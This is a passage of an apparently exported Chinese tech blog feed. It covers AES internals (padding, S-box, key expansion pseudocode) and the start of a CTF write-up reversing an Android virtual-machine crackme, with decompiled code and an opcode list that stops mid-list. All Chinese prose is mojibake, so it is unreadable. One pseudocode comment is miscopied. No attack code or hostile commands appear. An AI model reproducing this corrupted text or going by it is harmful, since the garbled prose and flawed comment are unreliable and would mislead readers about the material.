å¦‚æœæ˜æ–‡å—å°‘äº16ä¸ªå­—èŠ‚ï¼ˆ<code>128bit</code>ï¼‰ï¼Œåœ¨æ˜æ–‡å—æœ«å°¾è¡¥è¶³ç›¸åº”æ•°é‡çš„å­—ç¬¦ï¼Œä¸”æ¯ä¸ªå­—èŠ‚çš„å€¼ç­‰äºç¼ºå°‘çš„å­—ç¬¦æ•°ã€‚ æ¯”å¦‚æ˜æ–‡ï¼š{1,2,3,4,5,a,b,c,d,e},ç¼ºå°‘6ä¸ªå­—èŠ‚ï¼Œåˆ™è¡¥å…¨ä¸º{1,2,3,4,5,a,b,c,d,e,6,6,6,6,6,6 }<br><code>ISO10126Padding</code>ï¼šå¦‚æœæ˜æ–‡å—å°‘äº16ä¸ªå­—èŠ‚ï¼ˆ<code>128bit</code>ï¼‰ï¼Œåœ¨æ˜æ–‡å—æœ«å°¾è¡¥è¶³ç›¸åº”æ•°é‡çš„å­—èŠ‚ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦å€¼ç­‰äºç¼ºå°‘çš„å­—ç¬¦æ•°ï¼Œå…¶ä»–å­—ç¬¦å¡«å……éšæœºæ•°ã€‚æ¯”å¦‚æ˜æ–‡ï¼š{1,2,3,4,5,a,b,c,d,e},ç¼ºå°‘6ä¸ªå­—èŠ‚ï¼Œåˆ™å¯èƒ½è¡¥å…¨ä¸º{1,2,3,4,5,a,b,c,d,e,5,c,3,G,$,6}<br><code>PKCS7Padding</code>åŸç†ä¸<code>PKCS5Padding</code>ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯<code>PKCS5Padding</code>çš„<code>blocksize</code>ä¸º8å­—èŠ‚ï¼Œè€Œ<code>PKCS7Padding</code>çš„<code>blocksize</code>å¯ä»¥ä¸º1åˆ°255å­—èŠ‚</li><li>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœåœ¨<code>AES</code>åŠ å¯†çš„æ—¶å€™ä½¿ç”¨äº†æŸä¸€ç§å¡«å……æ–¹å¼ï¼Œè§£å¯†çš„æ—¶å€™ä¹Ÿå¿…é¡»é‡‡ç”¨åŒæ ·çš„å¡«å……æ–¹å¼ã€‚</li></ul><p>ç„¶åæ¯ä¸€å—æŒ‰åºæ’åˆ—æˆ4x4çŸ©é˜µ</p><h3 id="Sç›’ç”Ÿæˆ">Sç›’ç”Ÿæˆ</h3><p><img src="https://pic1.zhimg.com/80/v2-9c648584654f34c8eaddf0f57dde2ec3_1440w.webp?source=1def8aca" alt="img"></p><p>è¿™ä¸ªè¡¨æ˜¯Sç›’ï¼Œç”Ÿæˆæ–¹æ³•å¦‚ä¸‹ï¼š</p><ol><li>å¯¹Sç›’åˆå§‹åŒ–ä¸º00ï¼Œ01ï¼Œ02ï¼Œ03ï¼Œâ€¦ï¼ŒFEï¼ŒFF</li><li>ç”¨æ¯ä¸€æ ¼çš„ä¹˜æ³•é€†å…ƒä»£æ›¿è¿™ä¸€æ ¼ï¼ŒåŸŸæ˜¯$GF(2^8)$</li><li>å¯¹æ¯ä¸€æ ¼çš„bitä½è¿›è¡Œè¿ç®—ï¼Œä»¤$b_i^ï¼Œ=b_i\oplus b_{i+4 mod 8}\oplus b_{i+5 mod 8}\oplus b_{i+6 mod 8}\oplus b_{i+7 mod 8}\oplus c_i$ï¼Œå…¶ä¸­$c = {01100011}$</li></ol><p>é€†Sç›’ï¼šç”¨äºè§£å¯†</p><h3 id="å­—èŠ‚æ›¿ä»£">å­—èŠ‚æ›¿ä»£</h3><p>é€šè¿‡æ¯ä¸€å­—èŠ‚å‰4ä½å’Œåå››ä½åˆ†åˆ«ä½œä¸ºSç›’çš„è¡Œæ ‡å’Œåˆ—æ ‡ï¼Œæ›¿æ¢ä¸ºå¯¹åº”ä½ç½®çš„å€¼</p><h3 id="è¡Œç§»ä½">è¡Œç§»ä½</h3><p>æŠŠä¸Šé¢å·²ç»åˆ†ä¸º4x4çš„çŸ©é˜µä¸­ï¼Œç¬¬iè¡Œå·¦ç§»iä½</p><h3 id="åˆ—æ··æ·†">åˆ—æ··æ·†</h3><p>æœ€çŸ©é˜µç»è¡ŒçŸ©é˜µä¹˜æ³•ï¼š<br>$$<br>\begin{bmatrix}<br>2 &amp; 3 &amp; 1 &amp; 1 \\<br>1 &amp; 2 &amp; 3 &amp; 1 \\<br>1 &amp; 1 &amp; 2 &amp; 3 \\<br>3 &amp; 1 &amp; 1 &amp; 2<br>\end{bmatrix} \tag{1}<br>*<br>before = after<br>$$</p><h3 id="è½®å¯†é’¥åŠ ">è½®å¯†é’¥åŠ </h3><p>æ¯ä¸€è½®è¾“å…¥ä¸è½®å¯†é’¥è¿›è¡Œå¼‚æˆ–ï¼Œè¯¥é¡¹ä¸€å®šå‡ºç°åœ¨åŠ å¯†çš„é¦–å°¾ï¼Œä¿è¯å®‰å…¨æ€§</p><p>è½®å¯†é’¥çš„ç”Ÿæˆæ˜¯åˆå§‹å¯†é’¥å’Œè¯¥è½®å­å¯†é’¥å¼‚æˆ–çš„ç»“æœ</p><h4 id="å¯†é’¥æ‰©å±•">å¯†é’¥æ‰©å±•</h4><p>å¯†é’¥æ‰©å±•ç”¨äºç”Ÿæˆå­å¯†é’¥</p><p>ç°åœ¨å‡è®¾å·²ç»æœ‰åˆå§‹å¯†é’¥çš„4x4çŸ©é˜µ</p><p>å¯¹å®ƒåˆ†åˆ—ï¼ˆä»¥åˆ—ä¸ºå•ä½åˆ†æˆ4ä¸ªï¼‰ä¸º$W_0ï¼ŒW_1,W_2,W_3$ã€‚é‚£ä¹ˆæ‰©å±•å¯†é’¥å°±æ˜¯æ‰©å±•å‡º$W_4ï¼ŒW_5,W_6â€¦$</p><p>å…·ä½“å…¬å¼æ˜¯ï¼š<br>$$<br>\begin{equation}<br>\left{<br>\begin{aligned}<br>W_i &amp; = W_{i-4} \oplus W_{i-1} \\<br>W_i &amp; = W_{i-4} \oplus T({W_{i-1}})<br>\end{aligned}<br>\right.<br>\end{equation}<br>$$<br>å…¶ä¸­Tæ˜¯å‡½æ•°å…¶ä½œç”¨æ˜¯ï¼š</p><ol><li>å‡è®¾è¾“å…¥çš„æ˜¯$W_i$</li><li>å¯¹è¿™ä¸€åˆ—å¾ªç¯å·¦ç§»ä¸€ä½ï¼ˆåˆ—ç§»ä½ï¼‰ï¼Œå¯¹äº$W_i$è¿™ä¸€åˆ—ï¼Œå°±æ˜¯ä¸Šç§»ä¸€ä½</li><li>ç”¨Sç›’å¯¹2ä¹‹åçš„$W_i$è¿›è¡Œå­—èŠ‚æ›¿ä»£ï¼Œè§„åˆ™åŒåŠ å¯†çš„å­—èŠ‚æ›¿ä»£</li><li>ä¸ç»™å®šçš„çŸ©é˜µè¿›è¡Œå¼‚æˆ–ï¼ŒçŸ©é˜µæ˜¯[RC[j],0,0,0]è½®å¸¸é‡æ˜¯RC = {01, 02, 04, 08, 10, 20, 40, 80, 1B, 36}.jæ˜¯è¯¥è½®è½®æ•°</li></ol><p>ç„¶åæ¯4åˆ—ä½œä¸ºä¸€ç»„æˆä¸ºè½®å¯†é’¥</p><h4 id="è¡¥å……">è¡¥å……</h4><blockquote><p><strong>1ï¼‰ä¸ºä»€ä¹ˆéœ€è¦å¯†é’¥æ‰©å±•ï¼š</strong></p><p>ä¸è®ºå¯†é’¥é•¿åº¦ä¸ºå¤šå°‘ï¼Œæˆ‘ä»¬çš„æ˜æ–‡åˆ†ç»„å§‹ç»ˆä¸º16å­—èŠ‚ï¼ˆ4å­—ï¼‰ã€‚ä¸Šæ–‡æåˆ°ï¼Œåœ¨è½®å¯†é’¥åŠ éƒ¨åˆ†ï¼Œæˆ‘ä»¬éœ€è¦ä¸ºæ¯ä¸€è½®æä¾›ä¸€ä¸ªé•¿åº¦ä¸º4å­—çš„è½®å¯†é’¥ã€‚</p><p>å¯¹äºAES-128ï¼ˆ4å­—å¯†é’¥ï¼‰ï¼Œéœ€è¦è¿­ä»£10è½®ï¼ŒåŠ ä¸Šç¬¬0è½®ï¼Œå…±éœ€è¦è¿›è¡Œ11æ¬¡è½®å¯†é’¥åŠ ï¼Œè€Œæ¯ä¸€æ¬¡è½®å¯†é’¥åŠ éƒ½éœ€è¦ä¸€ä¸ªé•¿åº¦ä¸º4å­—çš„è½®å¯†é’¥ï¼Œå› æ­¤æ‰€éœ€è¦çš„æ‰©å±•å¯†é’¥é•¿åº¦ä¸º æ¬¡å­—å­—11æ¬¡Ã—4å­—=44å­— ã€‚</p><p>å¯¹äºAES-192ï¼ˆ6å­—å¯†é’¥ï¼‰ï¼Œéœ€è¦è¿­ä»£12è½®ï¼ŒåŠ ä¸Šç¬¬0è½®ï¼Œå…±éœ€è¦è¿›è¡Œ13æ¬¡è½®å¯†é’¥åŠ ï¼Œæ‰€éœ€è¦çš„æ‰©å±•å¯†é’¥é•¿åº¦ä¸º æ¬¡å­—å­—13æ¬¡Ã—4å­—=52å­— ã€‚</p><p>å¯¹äºAES-256ï¼ˆ8å­—å¯†é’¥ï¼‰ï¼Œéœ€è¦è¿­ä»£14è½®ï¼ŒåŠ ä¸Šç¬¬0è½®ï¼Œå…±éœ€è¦è¿›è¡Œ15æ¬¡è½®å¯†é’¥åŠ ï¼Œæ‰€éœ€è¦çš„æ‰©å±•å¯†é’¥é•¿åº¦ä¸º æ¬¡å­—å­—15æ¬¡Ã—4å­—=60å­— ã€‚</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€å®šçš„æ–¹æ³•ç”¨æ¥å°†å¯†é’¥æ‰©å±•åˆ°ä¸€å®šçš„é•¿åº¦ã€‚</p></blockquote><blockquote><p><strong>ï¼ˆ2ï¼‰AES-192çš„å¯†é’¥æ‰©å±•æ–¹æ³•ï¼š</strong></p><p>AES-192çš„å¯†é’¥æœ‰6ä¸ªå­—ï¼Œå…¶å¯†é’¥æ‰©å±•æ–¹æ³•ä¸AES-128å®Œå…¨ç±»ä¼¼ã€‚ç¬¬ä¸€ä¸ªforå¾ªç¯çš„å¡«å……å˜æˆäº†6ä¸ªå­—ï¼›ä¹‹åçš„åˆ¤æ–­æ•´é™¤æ¡ä»¶å˜ä¸ºäº†èƒ½å¦æ•´é™¤6ã€‚</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åªæ˜¯ä¼ªä»£ç ï¼Œä¸èƒ½è¿è¡Œ</span></span><br><span class="line"><span class="title function_">KeyExpansion</span>(<span class="type">byte</span> <span class="built_in">key</span>[<span class="number">24</span>], word w[<span class="number">52</span>])</span><br><span class="line">&#123;</span><br><span class="line">    word temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)<span class="comment">//ç¬¬ä¸€ä¸ªforå¾ªç¯ï¼Œå¡«å……wçš„å‰6ä¸ªå­—</span></span><br><span class="line">        w[i] = &#123;<span class="built_in">key</span>[<span class="number">4</span>*i], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">1</span>], </span><br><span class="line">                <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">2</span>], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">3</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">52</span>; i++)<span class="comment">//ç¬¬äºŒä¸ªforå¾ªç¯ï¼Œå¡«å……åé¢çš„å†…å®¹</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = w[i<span class="number">-1</span>];<span class="comment">//ä¿å­˜ä¸Šä¸€ä¸ªå­—</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">6</span> == <span class="number">0</span>)<span class="comment">//å¦‚æœæ•´é™¤6</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (<span class="title function_">RotWord</span> (temp))</span><br><span class="line">                    xor Rcon[i/<span class="number">6</span>];<span class="comment">//å¯¹ä¿å­˜çš„ä¸Šä¸€ä¸ªå­—è¿›è¡Œå¤æ‚çš„å¤„ç†</span></span><br><span class="line">        w[i] = w[i<span class="number">-6</span>] xor temp;<span class="comment">/*å°†ä¸Šä¸€ä¸ªå­—ï¼ˆå¤„ç†æˆ–æ²¡å¤„ç†è¿‡ï¼‰</span></span><br><span class="line"><span class="comment">                               ä¸6ä¸ªå­—ä¹‹å‰çš„å­—è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°å½“å‰çš„å­—*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰AES-256çš„å¯†é’¥æ‰©å±•æ–¹æ³•ï¼š</strong></p><p>AES-256çš„å¯†é’¥é•¿åº¦ä¸º8å­—ã€‚å…¶å¯†é’¥æ‰©å±•ä¸AES-128ä¹ŸåŸºæœ¬ç›¸åŒï¼Œåªæ˜¯ä¿®æ”¹äº†å¡«å……çš„å­—æ•°ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šAES-256åœ¨ç¬¬äºŒä¸ªforå¾ªç¯é‡Œæ·»åŠ äº†åˆ¤æ–­æ¡ä»¶ï¼Œå½“i%==4æ—¶ï¼Œè¦å¯¹tempè¿›è¡Œä¸€æ¬¡å­—ä»£æ›¿ã€‚</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åªæ˜¯ä¼ªä»£ç ï¼Œä¸èƒ½è¿è¡Œ</span></span><br><span class="line"><span class="title function_">KeyExpansion</span>(<span class="type">byte</span> <span class="built_in">key</span>[<span class="number">32</span>], word w[<span class="number">60</span>])</span><br><span class="line">&#123;</span><br><span class="line">    word temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)<span class="comment">//ç¬¬ä¸€ä¸ªforå¾ªç¯ï¼Œå¡«å……wçš„å‰8ä¸ªå­—</span></span><br><span class="line">        w[i] = &#123;<span class="built_in">key</span>[<span class="number">4</span>*i], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">1</span>], </span><br><span class="line">                <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">2</span>], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">3</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">8</span>; i &lt; <span class="number">60</span>; i++)<span class="comment">//ç¬¬äºŒä¸ªforå¾ªç¯ï¼Œå¡«å……åé¢çš„å†…å®¹</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = w[i<span class="number">-1</span>];<span class="comment">//ä¿å­˜ä¸Šä¸€ä¸ªå­—</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)<span class="comment">//å¦‚æœæ•´é™¤8</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (<span class="title function_">RotWord</span> (temp))</span><br><span class="line">                    xor Rcon[i/<span class="number">8</span>];<span class="comment">//å¯¹ä¿å­˜çš„ä¸Šä¸€ä¸ªå­—è¿›è¡Œå¤æ‚çš„å¤„ç†</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">8</span> == <span class="number">4</span>)<span class="comment">//å¦‚æœé™¤8ä½™4</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (temp);</span><br><span class="line">        w[i] = w[i<span class="number">-8</span>] xor temp;<span class="comment">/*å°†ä¸Šä¸€ä¸ªå­—ï¼ˆå¤„ç†æˆ–æ²¡å¤„ç†è¿‡ï¼‰</span></span><br><span class="line"><span class="comment">                               ä¸6ä¸ªå­—ä¹‹å‰çš„å­—è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°å½“å‰çš„å­—*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://xn--zhuanlan-u11qx77cqzag36q.zhihu.com/p/360393988">æ­¤æ®µæ‘˜è‡ªzhuanlan.zhihu.com/p/360393988</a></p></blockquote><h3 id="æ€»è¿‡ç¨‹">æ€»è¿‡ç¨‹</h3><p>åŠ å¯†æ—¶ï¼Œæ‰§è¡Œï¼š</p><ul><li>è½®å¯†é’¥åŠ </li><li>ï¼ˆå­—èŠ‚æ›¿ä»£+è¡Œä½ç§»+åˆ—æ··æ·†+è½®å¯†é’¥åŠ ï¼‰*9</li><li>å­—èŠ‚æ›¿ä»£+è¡Œä½ç§»+è½®å¯†é’¥åŠ </li></ul><p>ä»¥ä¸Šè¿‡ç¨‹æ˜¯å¯¹äº16å­—èŠ‚å¯†é’¥çš„</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç  </tag>
            
            <tag> åŠ å¯†æ–¹æ³• </tag>
            
            <tag> å¯¹ç§°åŠ å¯† </tag>
            
            <tag> æµåŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-VM(2)</title>
      <link href="/posts/b22e135.html"/>
      <url>/posts/b22e135.html</url>
      
        <content type="html"><![CDATA[<p>å°è¯•å¯¹è™šæ‹Ÿæœºä¿æŠ¤æœ‰æ›´æ·±çš„ç†è§£ã€‚</p><p>ç”±äºä¹‹å‰åšvmé¢˜æ„Ÿè§‰å®Œå…¨ä¸ä¼šï¼Œæ‰€ä»¥æ‰¾äº†å‡ é“é¢˜è¯•ä¸€è¯•</p><p>ç”±ä¹‹å‰çš„vmç®€è¦ä»‹ç»çœ‹åˆ°vmé¢˜æ€»æ˜¯ç»™å‡ºopcodeçš„è¿è¡Œæ–¹å¼ï¼Œç„¶åé€šè¿‡opcodeè¿˜åŸå‡ºè¿è¡Œé€»è¾‘ï¼Œæœ€åæ±‚å‡ºflag</p><h2 id="EzADVM">EzADVM</h2><p>è¿™ä¸ªæ˜¯ä¸ªå®‰å“vmï¼Œjadxæ‰“å¼€ï¼Œç„¶åæ‰“å¼€main_activity,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CheckClick</span><span class="params">(View a)</span> &#123;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.sampleText;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">flagText</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.flagtext;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flagstring</span> <span class="operator">=</span> flagText.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Right!&quot;</span>.equals(stringFromJNI(flagstring))) &#123;</span><br><span class="line">            tv.setText(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">            tv.setTextColor(-<span class="number">16711936</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰stringFromJNI(flagstring)ï¼Œå»æ‰¾å‡½æ•°åŸå‹ï¼Œæ²¡æ‰¾åˆ°ï¼Œåº”è¯¥åœ¨åº“é‡Œã€‚</p><p>ç”¨apktoolåç¼–è¯‘å‡ºæºä»£ç ã€‚æ‰“å¼€soæ–‡ä»¶</p><p>é‡ç‚¹æ˜¯è¿™äº›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">now_num = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  used_char = _JNIEnv::GetStringUTFChars(in, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !i++ )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;(v14, <span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        v7 = (<span class="type">const</span> <span class="type">char</span> *)sub_20F50(v14);</span><br><span class="line">        v13 = _JNIEnv::NewStringUTF(in, v7);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v14);</span><br><span class="line">        <span class="keyword">return</span> v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( code[i] != <span class="number">0x21</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __strcpy_chk(input, used_char, <span class="number">1024LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0x88</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( code[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA1</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = or_not_num &amp; or_num;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC3</span>u:</span><br><span class="line">        or_num = b1 | b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB2</span>u:</span><br><span class="line">        not_1 = ~b1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xE5</span>u:</span><br><span class="line">        not_2 = ~b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF1</span>u:</span><br><span class="line">        b1 = input[now_num];</span><br><span class="line">        b2 = input[++now_num];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xD4</span>u:</span><br><span class="line">        or_not_num = not_2 | not_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBF</span>u:</span><br><span class="line">        i_form = now_num++;</span><br><span class="line">        save[<span class="number">0</span>] = s[i_form];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x99</span>u:</span><br><span class="line">        now_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBB</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = now_num + save[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;last, s, <span class="number">0x20</span>uLL) )</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç”¨æ¥åˆå§‹åŒ–inputäº†ï¼Œæ‰€ä»¥ç›¸å½“äºæ˜¯ç”¨æŒ‡ä»¤ç å¯¹inputåŠ å¯†ï¼Œæœ€åå¾—åˆ°last</p><p>ä»¥åŠä¸€å¼€å§‹æœ‰ä¸€ä¸ªå¾ªç¯åªæœ‰å½“code[i]==0å…ˆ1æ—¶æ‰ä¼šæ‰§è¡Œåˆå§‹åŒ–ï¼Œæ‰€ä»¥åªéœ€è¦åŒ¹é…åˆç†çš„æŒ‡ä»¤å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, 